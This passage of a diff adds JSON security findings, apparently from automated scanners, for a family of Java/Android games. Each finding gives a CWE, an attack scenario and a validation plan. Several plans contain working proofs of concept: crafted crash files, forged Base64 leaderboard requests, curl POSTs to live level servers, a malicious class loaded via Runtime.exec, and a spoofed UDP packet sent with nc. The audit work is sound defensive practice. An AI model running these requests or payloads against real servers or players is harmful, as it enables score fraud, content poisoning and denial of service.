+    "validation_plan": "In a test emulator with a constrained heap, redirect the endpoint to a lab server that streams repeated valid 11-line records indefinitely. Launch the app and monitor `adb shell dumpsys meminfo` and logcat. Monotonically growing heap followed by OutOfMemoryError originating from readLine or the ArrayList additions confirms the weakness.",
+    "line": 182,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoMonoAndroid",
+    "file": "ApoMonoUserlevelsLoad.java",
+    "category": "resource_exhaustion",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-400",
+    "title": "Unbounded level-server response can exhaust heap and CPU",
+    "reachable": true,
+    "attack_scenario": "The attacker serves hundreds of thousands of complete 11-line records or keeps sending records without EOF. The loader retains every line in eleven growing lists; if the body eventually ends, the quadratic sort adds sustained CPU use. The attacker gains a remotely triggered application hang or OutOfMemoryError/process termination.",
+    "validation_plan": "Route get_level.php to a controlled HTTP stub. Repeatedly emit an 11-line record consisting of level 000, numeric values for the float/integer slots, and a short name, either indefinitely or for several hundred thousand records. Launch the online app and monitor adb shell dumpsys meminfo plus logcat. Monotonic heap growth, prolonged sorting after EOF, an OutOfMemoryError, or process death confirms the finding.",
+    "line": 184,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "myTreasureAndroid",
+    "file": "MyTreasureUserlevelsLoad.java",
+    "category": "resource_exhaustion",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-400",
+    "title": "Unbounded shared-level response can exhaust application memory",
+    "reachable": true,
+    "attack_scenario": "A malicious server or HTTP interceptor sends an indefinitely chunked response consisting of repeated valid 11-line records and never closes it. The background loader retains every parsed String, Integer, and Float in its lists. Heap use rises until Android kills the process or Java throws an uncaught OutOfMemoryError, denying use of the game merely by launching it online.",
+    "validation_plan": "Proxy get_level.php to an HTTP handler that repeatedly emits a valid 11-line record such as 010110000 plus ten valid metadata lines, flushes each batch, and keeps the body open. Launch the app and monitor its process with Android Studio Memory Profiler or adb shell dumpsys meminfo. Continuously increasing heap followed by OutOfMemoryError or process death, with MyTreasureUserlevelsLoad.load() active, confirms the issue.",
+    "line": 210,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoDefence",
+    "file": "ApoDefenceHighscore.java",
+    "category": "client_side_trust",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-602",
+    "title": "Editable levels and reversible parameters permit forged leaderboard scores",
+    "reachable": true,
+    "attack_scenario": "Create an easy level named Original_First.defence with excessive starting money, weak enemy ordering and otherwise default tuning. Load it and finish the altered map. Because its basename is treated as the map identity and its own values satisfy the local original check, the client offers Upload for the Original_First leaderboard. A cheater can also generate a request directly, replacing points with five rounds of standard Base64 and cor with two rounds of Base64 over the current day. If the endpoint trusts this documented client protocol, the attacker gains a fraudulent leaderboard entry.",
+    "validation_plan": "Against an authorized staging instance, create a valid easy .defence file named Original_First.defence, leave the option tunings at defaults, load and finish it, and capture the Upload GET through an HTTP proxy. Decode name three times, map four times, level twice and points five times with standard Base64; confirm that the request claims map Original_First despite altered level contents. Then, using a disposable nickname, replay the request with points encoding 999999 and a correctly encoded current day. Retrieval of that value in highscore.xml proves server-side exploitability.",
+    "line": 180,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoDefence",
+    "file": "ApoDefenceHighscore.java",
+    "category": "insecure_transport",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-319",
+    "title": "High-score retrieval and submission use unauthenticated HTTP",
+    "reachable": true,
+    "attack_scenario": "A network attacker intercepts HTTP for home.arcor.de and daporius.drition.net, returns a valid probe image, then alters highscore.xml to display fabricated rankings. When the player clicks Upload, the attacker reads the nickname and score and changes the points or map query before forwarding it. This compromises leaderboard integrity and can selectively suppress the online feature.",
+    "validation_plan": "Route both fixed hosts through a controlled HTTP proxy or DNS override. Return a valid small GIF for test.gif, serve well-formed highscore.xml with a distinctive fabricated nickname, and verify that the game renders it. Capture an Upload request, modify its points parameter in transit, and verify at the controlled receiver that the modified plaintext request arrives. A packet capture should show that neither direction is encrypted or authenticated.",
+    "line": 191,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoDefence",
+    "file": "ApoDefenceLoadSave.java",
+    "category": "unsafe_custom_parser",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-789",
+    "title": "Eight-byte level header can drive multi-gigabyte image allocation",
+    "reachable": true,
+    "attack_scenario": "Place or distribute an eight-byte .defence file containing big-endian integers 1000 and 1000. The first allocation is roughly 4 MB, after which EOF is swallowed. The caller continues with the partial state and attempts a 32000-by-32000 RGB image, requiring roughly 4 GB of pixel storage. On an ordinary game JVM this causes OutOfMemoryError or termination. Replacing the predictable default level can trigger the crash at startup; otherwise the victim must select the file.",
+    "validation_plan": "Create oom.defence using DataOutputStream.writeInt(1000) twice and no further bytes. Run the game with -Xmx256m and either replace levels/Original_First.defence or select oom.defence using Load. Confirmation is an EOFException message followed by an uncaught OutOfMemoryError or allocation failure whose stack includes ApoDefenceGame.makeNewXAndY()/BufferedImage. Repeat with 20-by-15 dimensions as a control; it should not exhaust memory.",
+    "line": 156,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoDefence",
+    "file": "ApoDefenceHighscore.java",
+    "category": "resource_exhaustion",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-400",
+    "title": "Unbounded synchronous high-score reads can hang or exhaust the game",
+    "reachable": true,
+    "attack_scenario": "When the player wins or loses, the attacker accepts the test.gif connection and never completes its response, indefinitely blocking the timer task. Alternatively, the attacker supplies a valid probe GIF and an endless or very large highscore.xml body; Scanner waits for EOF while retaining the token, growing the heap until the game stalls or throws OutOfMemoryError.",
+    "validation_plan": "Redirect the fixed hosts to a controlled HTTP server. First accept the test.gif request but never send EOF; use jstack to confirm ApoDefenceTimer is blocked below ImageIO/URLConnection and observe that game updates cease. In a second run, return a valid GIF and stream highscore.xml indefinitely or to a size exceeding a constrained -Xmx256m heap. Increasing heap usage followed by OutOfMemoryError at Scanner.next()/makeEntity confirms the unbounded-read path.",
+    "line": 87,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoMario",
+    "file": "ApoMarioEditorIO.java",
+    "category": "unsafe_custom_parser",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-20",
+    "title": "MAR dimensions drive an unchecked two-dimensional allocation",
+    "reachable": true,
+    "attack_scenario": "An attacker distributes a .mar file whose first eight bytes encode width 2147483647 and height 1. When the victim opens it, the game attempts an enormous row allocation and throws OutOfMemoryError. The catch at ApoMarioEditorIO.java:129 catches Exception, not Error, so the allocation failure escapes and can terminate or disable the game UI.",
+    "validation_plan": "Create an eight-byte .mar file containing big-endian integers 0x7fffffff and 0x00000001. Launch the game with -Xmx128m, choose Load Editor Level, and confirm OutOfMemoryError points to ApoMarioEditorIO.java:57. Also confirm ApoMarioPanel.java:256 is not reached, leaving thinking disabled if the process survives.",
+    "line": 57,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoNotSoSimple",
+    "file": "ApoNotSoSimpleUserLevels.java",
+    "category": "resource_exhaustion",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-400",
+    "title": "Unbounded server record count feeds quadratic insertion sorts",
+    "reachable": true,
+    "attack_scenario": "A malicious server or HTTP interceptor returns a very large but structurally complete set of five-line records. All strings remain resident, and reverse-sorted usernames and level names force repeated insertion and array shifting. CPU and heap consumption can freeze the game or exhaust the shared JVM, giving a remote denial of service without relying on malformed records.",
+    "validation_plan": "Use a local HTTP proxy and return 50,000 complete five-line records with reverse-sorted username and level-name lines. Launch with a constrained heap such as -Xmx64m. Record the load thread's CPU time and heap; prolonged sorting, OutOfMemoryError, or an unresponsive game confirms the issue. Keep all records complete to isolate this finding from ApoNotSoSimple-03.",
+    "line": 68,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoSimple",
+    "file": "ApoSimpleLevelSolution.java",
+    "category": "resource_exhaustion",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-400",
+    "title": "Invalid shared-level cells trigger combinatorial solver CPU exhaustion",
+    "reachable": true,
+    "attack_scenario": "The attacker returns a level field made from \"99\" repeated 49 times plus \"999\" for the stars, followed by valid metadata. All 49 cells are numeric but outside the defined 0-25 domain (ApoSimpleConstants.java:366-396). Selecting the level starts a 49-way, four-move search in which invalid cells do not move or become solved, causing millions of candidate simulations and sustained CPU consumption.",
+    "validation_plan": "Serve a five-line record whose first line is `\"99\" * 49 + \"999\"` and whose remaining lines are `0`, `1`, `1`, and `0`. Select Userlevels and record process CPU plus thread stacks. Confirmation is a solver thread remaining in ApoSimpleLevelSolution.canBeSolved/getMinSolution, repeatedly reaching the line-237 step guard; terminate the test rather than waiting for completion.",
+    "line": 86,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoSoccer",
+    "file": "ApoSoccerReplayIO.java",
+    "category": "unsafe_custom_parser",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-129",
+    "title": "Replay track counts can crash playback or exhaust memory",
+    "reachable": true,
+    "attack_scenario": "An attacker shares a syntactically complete replay with one ball point but zero points in each player track. The victim loads it and presses replay play. The ball-size guard passes at step zero, the first empty player list is indexed, and an uncaught IndexOutOfBoundsException terminates the game loop. A large positive count with enough coordinate bytes also creates unbounded ApoFloatPoint objects and can exhaust the heap.",
+    "validation_plan": "Create a binary replay using DataOutputStream: writeUTF(\"H\"), writeUTF(\"V\"), writeInt(1), two floats for the ball, then writeInt(0) eight times. Load it with \"replay load\", press \"replay play\", and confirm an IndexOutOfBoundsException at ApoSoccerReplay.setEntityPosition line 340 and cessation of the ApoThread loop. For memory impact, repeat under -Xmx128m with a large count and matching float pairs.",
+    "line": 114,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoStarz",
+    "file": "ApoStarzLevelLoad.java",
+    "category": "resource_exhaustion",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-835",
+    "title": "Four-character .ase level triggers a non-terminating parser loop",
+    "reachable": true,
+    "attack_scenario": "Create an .ase file whose first line is exactly ab\"!. The first a selects method one, b produces width 2, the double quote declares one wall, and ! decodes to position 1. At line 209 the condition becomes 1 > 0, while line 211 repeatedly subtracts 0. Opening the file freezes the game thread and consumes a CPU core. A malicious level/highscore server can deliver the same level string to the applet.",
+    "validation_plan": "Put the single line ab\"! in a file named hang.ase, launch the desktop game, choose Load, and select it. Run the process under a timeout and capture a thread dump. Continuous CPU use and a stack fixed at ApoStarzLevelLoad.setWall(), lines 209-211, confirm the issue.",
+    "line": 209,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoDice",
+    "file": "ApoDiceUserlevels.java",
+    "category": "weak_integrity_check",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-345",
+    "title": "Unauthenticated, unattributed level submission to shared server; client-side-only dedupe and validation",
+    "reachable": true,
+    "attack_scenario": "An attacker scripts curl -d 'level=<arbitrary string>' http://www.apo-games.de/apoDice4k/save_level.php to (1) flood the shared pool every player downloads at startup, (2) plant malformed payloads that crash clients (ApoDice-02), or (3) push unsolvable/joke levels, since neither identity nor solvability nor format is enforced by the client protocol. The client-side dedupe at ApoDiceUserlevels.java:84-88 is trivially bypassed and provides no server-side guarantee.",
+    "validation_plan": "From a desktop: curl -X POST -d 'level=1111111111111111111111111111111111111111111111111111111111111111' http://www.apo-games.de/apoDice4k/save_level.php, then open the game on a device, tap 'userlevels', and confirm the injected level appears in the list. Repeat with a mutated string to show the dedupe does not block server-side entries.",
+    "line": 89,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "BitsEngineAndroid",
+    "file": "BitsMusicPlayer.java",
+    "category": "unsafe_native_call",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-119",
+    "title": "Attacker-readable file bytes passed straight into native libmodplug parser (ModPlug_JLoad)",
+    "reachable": false,
+    "attack_scenario": "Attacker supplies a malicious module file (classic libmodplug CVE families: OOB reads/writes in S3M/IT/MOD loaders) named song.xm in the shared folder /sdcard/BitsEngine-Game/. Victim plays the track; malformed structures hit C code with no bounds checking, yielding native memory corruption -> crash at minimum, potential code execution in-process with the game's permissions.",
+    "validation_plan": "In an engine test app call BitsMusicPlayer.getInstance().play('/sdcard/BitsEngine-Game/craft.xm', pitch=1, volume=1, loop=false) with a known libmodplug crasher input (e.g. a truncated/oversized instrument-count IT file from an ASAN libmodplug PoC); observe SIGSEGV with libmodplug.so frames in the tombstone (adb bugreport). A clean parse of a valid .xm serves as negative control.",
+    "line": 90,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoBot",
+    "file": "ApoBotImage.java",
+    "category": "resource_exhaustion",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-400",
+    "title": "Single tile-height int from level file drives near-unbounded render loop (UI hang)",
+    "reachable": true,
+    "attack_scenario": "Attacker sets one tile's height field to 0x7FFFFFFF in a crafted .bot (or MITM response). On load, the game freezes indefinitely inside getIBackground (jstack shows the thread parked in the loop); user must kill the process. Client-side hang only, but 100% reliable and cheaper for the attacker than memory exhaustion.",
+    "validation_plan": "Take a working .bot, patch the height int of tile [0][0] to 2000000000, load it, and observe the freeze; capture jstack showing the stuck frame in apoBot.ApoBotImage.getIBackground. Repeat with height=50000 to measure linear time growth, confirming loop-bound control.",
+    "line": 116,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoDefence",
+    "file": "ApoDefenceHighscore.java",
+    "category": "weak_integrity_check",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-345",
+    "title": "Score submission over cleartext HTTP where the only 'protection' is iterated Base64 (Base64Coder misnamed Encrypt) plus a day-of-month check",
+    "reachable": true,
+    "attack_scenario": "(1) Forgery without playing: anyone computes the encoding offline (e.g. points=999999 quintuple-Base64) and curls the URL - the 'cor' parameter is just double-Base64 of the day-of-month, guessable forever. (2) On-path tampering: because it is cleartext HTTP, a MITM rewrites the points parameter in flight. (3) Gate bypass: the only client-side guard is isOriginal() (ApoDefenceOptions.java:81-88), which compares live settings to money/towerCount/waves read back from the user-editable .defence file itself (ApoDefenceOptionsGeneral.java:148-166), so crafting a level file with generous values makes 'original' true. Amplifier: the map value sent is the level FILE NAME (loadSave.getLevel(), ApoDefenceGame.java:777; ApoDefenceLoadSave.java:154) taken unsanitized from disk, so a distributed level named 'X&points=<forged>&...' injects parameters into the GET.",
+    "validation_plan": "Replicate encoding in python: b64(b64(b64('Cheater')))=name, b64^4('Original_First')=map, b64^2('40')=level, b64^5('999999')=points, b64^2(str(datetime.day))=cor; curl 'http://daporius.drition.net/highscore.php?name=..&map=..&..' while tcpdump shows the plaintext request; if the server were resurrected, re-fetching highscore.xml would list Cheater/999999. Offline proof: decode any captured legitimate request with 5x base64-decode to recover exact fields.",
+    "line": 191,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoImp",
+    "file": "ApoImpConstants.java",
+    "category": "insecure_transport",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-319",
+    "title": "User-level download/upload over plain HTTP with no authentication (MITM-injectable game content)",
+    "reachable": true,
+    "attack_scenario": "Attacker on the same LAN (or any DNS/network hijack of www.apo-games.de, no TLS so no warning possible) answers get_level.php with crafted rows whose numeric columns are digits but whose i%11==0 'level' lines are hostile payloads (see ApoImp-02). The payload is fetched automatically at game start; the victim just clicks the 'userlevels' menu button and the malformed level is parsed, crashing the game. Uploaded levels can equally be stripped/replaced in transit, poisoning the shared level pool.",
+    "validation_plan": "Run the game while capturing with `tcpdump -A port 80` orWireshark: startup shows a cleartext POST to /apoElf/get_level.php and clicking Upload shows POST body 'level=<digits>'. Then redirect www.apo-games.de to 127.0.0.1 via /etc/hosts, serve a stub PHP that echoes 11-line groups with valid integers and a malicious level line (e.g. 100 chars, see ApoImp-02), and observe the client accept it without any certificate/trust error.",
+    "line": 15,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoPongBeat",
+    "file": "ServerBrowser.java",
+    "category": "client_side_trust",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-345",
+    "title": "LAN UDP broadcast accepted unauthenticated as game-server entry; hand-rolled binary parser (dead network stack carried from siblings)",
+    "reachable": false,
+    "attack_scenario": "(where wired, e.g. sibling ApoSoccer) Attacker broadcasts a forged packet from a laptop: victim's browser lists 'FastGameServer 10.0.0.5:1337'; joining routes game traffic and any future protocol-level trust to the attacker. Spoofed source IP is unnecessary since no authentication exists.",
+    "validation_plan": "(1) Dormancy: grep proves no imports; run the game with tcpdump - no traffic. (2) Capability proof: harness starts new ServerBrowser(4445).startBrowser(); send UDP payload [lenHi,lenLo][containerLenHi,Lo][msgTypeHi,Lo][TYPE_STRING len][\"EvilServer\"][TYPE_INT port][TYPE_INT 0] via nc -u; log line 'ServerBrowser: Server EvilServer added!' confirms LAN spoof acceptance.",
+    "line": 92,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoRelax",
+    "file": "ApoRelaxRandomLevels.java",
+    "category": "insecure_transport",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-319",
+    "title": "Remote random-image fetch from zufallsbild.com (HTTP scrape + ImageIO.read of derived URL) trapped in dead else-branch behind tautological condition",
+    "reachable": false,
+    "attack_scenario": "As shipped: unreachable, no attacker gain. If re-enabled: anyone controlling DNS/routing for zufallsbild.com (dead domain, trivially registrable) serves HTML whose '.jpg'-adjacent text steers imageString to an attacker URL, making the client issue GETs to arbitrary hosts (SSRF-style beacon) and feeding chosen bytes into the ImageIO decoder of every player clicking 'random level'.",
+    "validation_plan": "Unreachability proof: evaluate the guard - (x || !x) == true for any B_APPLET, so the else is dead code; confirm via coverage (JaCoCo shows lines 27-61 never executed after playing a random level). Behavior proof: in a scratch copy replace the guard with 'if (!ApoConstants.B_APPLET)', add '127.0.0.1 www.zufallsbild.com' to /etc/hosts, serve an HTML page whose first '.jpg' context yields '/evil.jpg'; observe the client fetching http://www.zufallsbild.com/evil.jpg and decoding it into tiles.",
+    "line": 51,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoSkunkman",
+    "file": "ApoSkunkmanClassLoader.java",
+    "category": "remote_code_loading",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-494",
+    "title": "Arbitrary local bytecode executed via ApoSkunkmanClassLoader.defineClass, auto-reloaded from skunkman.properties at every startup",
+    "reachable": true,
+    "attack_scenario": "The game is an AI-programming contest platform. An attacker posts a 'cool bot' zip containing Evil.class plus a skunkman.properties preset pointing aiOne at it. Victim extracts into the game dir and starts the game: the class instantiates before any gameplay, executing attacker code (file theft, reverse shell) with the victim's user rights. Alternatively anyone who can write to skunkman.properties (or swap the recorded path) turns the next launch into code execution.",
+    "validation_plan": "Compile 'public class Evil extends apoSkunkman.ai.ApoSkunkmanAI' whose constructor does Files.write(Paths.get(\"pwned.txt\"),\"rce\".getBytes()) (stub remaining abstract methods). Run the shipped jar, use the player 'load AI' button on Evil.class: pwned.txt appears. Then set aiOne=<abs-path>\\Evil.class in skunkman.properties, relaunch: pwned.txt appears with zero interaction. Note also loadClass() is child-first (defineClass attempted before findSystemClass, lines 58-82), so a planted e.g. javax/swing class in the AI dir shadows application classes.",
+    "line": 64,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoSlitherLink",
+    "file": "ApoSlitherLinkEditor.java",
+    "category": "client_side_trust",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "medium",
+    "cwe": "CWE-345",
+    "title": "Unauthenticated level upload feeds a shared pool auto-downloaded by all clients",
+    "reachable": true,
+    "attack_scenario": "An attacker scripts POSTs of crafted level strings (e.g. dimension bombs or garbage puzzles) directly to save_highscore.php - the game client itself performs no authentication, so neither does the minimal protocol. All players silently receive the poisoned entries as custom levels at next start; combined with ApoSlitherLink-02 this turns into a remote crash delivered through the official channel.",
+    "validation_plan": "Replay the exact request: curl -X POST -d 'level=0404%20%20%20%20&solution=a&name=Apo' http://www.apo-games.de/apoSlitherLink/save_highscore.php, then run the stock client and confirm the injected level appears under Custom. If the original endpoint is offline, host a mirror and repoint DNS.",
+    "line": 119,
+    "clone_variants": 1,
+    "clone_distinct_versions": 1,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoBot",
+    "file": "ApoIO.java",
+    "category": "resource_exhaustion",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "low",
+    "cwe": "CWE-400",
+    "title": "Applet level reads have no connect or read timeout",
+    "reachable": true,
+    "attack_scenario": "The attacker accepts the applet's HTTP connection, sends a successful response and fewer than four body bytes, then keeps the socket open. ApoBotLevelIO.readLevel blocks while reading its first integer, preventing component initialization from completing for as long as the attacker maintains the connection.",
+    "validation_plan": "Route the hard-coded host to a test server that returns HTTP 200, sends one payload byte, and leaves the connection open. Start ApoBotApplet and wait longer than normal initialization. Confirm the UI does not finish loading and a JVM thread dump remains blocked below ApoIO.readLevel/ApoBotLevelIO.readLevel until the server closes the socket.",
+    "line": 220,
+    "clone_variants": 17,
+    "clone_distinct_versions": 6,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoSimpleSudoku",
+    "file": "ApoHelp.java",
+    "category": "insecure_transport",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "low",
+    "cwe": "CWE-319",
+    "title": "Applet progress is loaded and saved over plain HTTP",
+    "reachable": true,
+    "attack_scenario": "A network attacker intercepts the cleartext request when an applet user opens Play. The attacker reads the submitted solved-level list or replaces the load response with \"0,1,...,30,\". The parser adds those values at ApoSimpleSudokuLevelChooser.java:144-149 and the renderer marks every level solved at lines 273-282. The practical impact is disclosure or corruption of game progress and cosmetic cheating; all level buttons are already visible at lines 52-63, so this does not unlock privileged functionality.",
+    "validation_plan": "Run the applet entry point in a legacy appletviewer or equivalent harness through an intercepting HTTP proxy. Click Play and verify a request to http://www.apo-games.de/apoSudoku/cookies.php. Return \"0,1,2,...,30,\" as the first response line and confirm that every level receives the solved overlay. Then solve a level and confirm that the cleartext request body contains SET, apoSudoku_level, and the progress list.",
+    "line": 424,
+    "clone_variants": 17,
+    "clone_distinct_versions": 14,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoStarz",
+    "file": "ApoClassLoader.java",
+    "category": "remote_code_loading",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "codex"
+    ],
+    "severity": "low",
+    "cwe": "CWE-494",
+    "title": "Dormant URL class loader can instantiate unsigned classes",
+    "reachable": false,
+    "attack_scenario": "There is no attack path through the shipped ApoStarz UI, main method, applet, file formats, or network responses. If future integration passes an attacker-controlled URL and class name to this utility and invokes getMyClass(), the attacker can host a class whose static initializer or constructor executes with the game's process privileges.",
+    "validation_plan": "First confirm the absence of callers with a full-source search for new ApoClassLoader and getMyClass. To demonstrate only the dormant capability, create a separate harness that sets ApoConstants.B_APPLET=true, hosts a test class over HTTP, invokes new ApoClassLoader(baseUrl, className).getMyClass(), and observes a constructor-created marker. This does not demonstrate reachability in the shipped game.",
+    "line": 68,
+    "clone_variants": 17,
+    "clone_distinct_versions": 2,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoCommando",
+    "file": "ApoIO.java",
+    "category": "insecure_transport",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-319",
+    "title": "ApoIO level read/write uses plain HTTP (no TLS, no integrity check) in applet mode; machinery present but unwired",
+    "reachable": false,
+    "attack_scenario": "Theoretical here: were the applet wired like sibling variants (e.g., fetching get_level.php / posting save_highscore.php over http://), a MITM on the player's LAN could tamper with downloaded level bytes (parsed by hand with no schema check downstream) and forge submitted scores. As shipped, there is no call site, so no network traffic occurs at all.",
+    "validation_plan": "(1) Prove the sink works: write a test subclass implementing readLevel(DataOutputStream)/readLevel(DataInputStream), run against a local netcat listener: java -cp . Test write http://127.0.0.1:9999/lvl -> observe plaintext POST body in nc (confirms no TLS/no signing); serve bytes from nc and observe them reaching the parser. (2) Prove absence as shipped: grep -rn 'extends ApoIO' and 'readLevel(' across all 72 files returns only the definitions in ApoIO.java itself.",
+    "line": 41,
+    "clone_variants": 17,
+    "clone_distinct_versions": 6,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoCommando",
+    "file": "ApoHelp.java",
+    "category": "weak_integrity_check",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-327",
+    "title": "MD5 helper (MessageDigest.getInstance(\"MD5\")) in shared ApoHelp, unused in this variant",
+    "reachable": false,
+    "attack_scenario": "Theoretical here: a local player who wants to cheat needs nothing this function provides (achievements live only in memory, see ApoMarioAchievements.java:46-65; no scores leave the machine). If a future edit adds score validation using this helper, both attacker-forgery (choose colliding input) and simple recompute-the-hash forgery apply.",
+    "validation_plan": "(1) Show the weakness generically: call ApoHelp.getMd5Digest on two known MD5 colliding blocks (e.g., the Daum-Luty 128-byte pair) and print identical output. (2) Show non-use as shipped: compile with a stub that throws from getMd5Digest and run the game normally (java apoCommando.ApoMarioMain, play a level, type commands in the DOS console) - no exception, confirming the code never executes.",
+    "line": 307,
+    "clone_variants": 17,
+    "clone_distinct_versions": 14,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoIcarus",
+    "file": "ApoHelp.java",
+    "category": "weak_integrity_check",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-345",
+    "title": "Achievements stored server-side via cookies.php and trusted blindly on load (applet mode)",
+    "reachable": true,
+    "attack_scenario": "MITM (or anyone issuing a direct request) sends SET=&name=apoIcarus_level&value=01234567 to cookies.php; every subsequent client loading achievements for that cookie value sees all 8 achievements unlocked. Conversely a MITM can strip/tamper stored progress. Gained: trivial achievement forgery and cross-user tampering on the shared service.",
+    "validation_plan": "Run the applet variant against a local rehost of PROGRAM_URL serving a stub cookies.php that answers GET=&name=apoIcarus_level with '0134'. Achievements screen lists indices 0,1,3,4 as earned. Then issue the raw SET request yourself and reload to confirm overwrite.",
+    "line": 446,
+    "clone_variants": 17,
+    "clone_distinct_versions": 14,
+    "n_reports": 2
+  },
+  {
+    "variant": "ApoIcarus",
+    "file": "ApoClassLoader.java",
+    "category": "remote_code_loading",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-494",
+    "title": "URLClassLoader-based remote/local class instantiation present but dead in this variant",
+    "reachable": false,
+    "attack_scenario": "Latent only: if a clone-and-own sibling passes an attacker-influenced path/classname (e.g., a downloaded 'level pack' directory), pointing it at hostile .class bytes yields immediate code execution in-process. In ApoIcarus as shipped, an attacker has no route to this sink.",
+    "validation_plan": "(1) Confirm deadness: grep -rn 'ApoClassLoader' returns only org/apogames/help/ApoClassLoader.java. (2) Prove impact-if-wired: compile class Evil{ public Evil(){Runtime.getRuntime().exec(\"calc\")}} into /tmp/evil/, then invoke new ApoClassLoader(\"file:/tmp/evil/\",\"Evil\").getMyClass() from any test main - constructor executes.",
+    "line": 69,
+    "clone_variants": 17,
+    "clone_distinct_versions": 2,
+    "n_reports": 1
+  },
+  {
+    "variant": "ApoIcejump",
+    "file": "ApoClassLoader.java",
+    "category": "remote_code_loading",
+    "status": "SINGLE_SOURCE",
+    "families": [
+      "oxa"
+    ],
+    "severity": "low",
+    "cwe": "CWE-494",
+    "title": "Shared URLClassLoader helper able to instantiate code from any URL - present but uncalled (dormant clone infra)",
+    "reachable": false,
